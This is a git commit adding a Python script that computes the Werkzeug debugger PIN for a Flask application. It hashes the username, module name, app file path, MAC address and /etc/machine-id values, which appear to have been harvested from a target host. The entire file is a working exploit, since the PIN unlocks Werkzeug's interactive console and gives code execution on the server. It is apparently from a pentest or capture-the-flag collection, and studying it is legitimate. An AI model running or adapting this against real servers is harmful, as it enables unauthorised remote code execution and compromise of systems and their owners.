4a91b8fe5ded73ddca5dbe13b51a4fb53308205e
Ian Curtis <71790592+vorkampfer@users.noreply.github.com>
2024-03-16 21:37:07 +0000

    Add files via upload

---
+++ opensource/werkzeug-pin-bypass.py
@@ -0,0 +1,43 @@
+import hashlib
+from itertools import chain
+probably_public_bits = [
+    'root',# username
+    'flask.app',# modname
+    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
+    '/usr/local/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None),
+]
+
+private_bits = [
+    '2485377892361',# str(uuid.getnode()),  /sys/class/net/ens33/address
+    '95fdec38-7d1f-4790-b361-58e905121f309f583358baac9d37c8e80672e5c08314eba1fa2b01afc4cfef42dee324d877f1'# get_machine_id(), /etc/machine-id
+]
+
+#h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
+h = hashlib.sha1()
+for bit in chain(probably_public_bits, private_bits):
+    if not bit:
+        continue
+    if isinstance(bit, str):
+        bit = bit.encode('utf-8')
+    h.update(bit)
+h.update(b'cookiesalt')
+#h.update(b'shittysalt')
+
+cookie_name = '__wzd' + h.hexdigest()[:20]
+
+num = None
+if num is None:
+    h.update(b'pinsalt')
+    num = ('%09d' % int(h.hexdigest(), 16))[:9]
+
+rv =None
+if rv is None:
+    for group_size in 5, 4, 3:
+        if len(num) % group_size == 0:
+            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
+                          for x in range(0, len(num), group_size))
+            break
+    else:
+        rv = num
+
+print(rv)
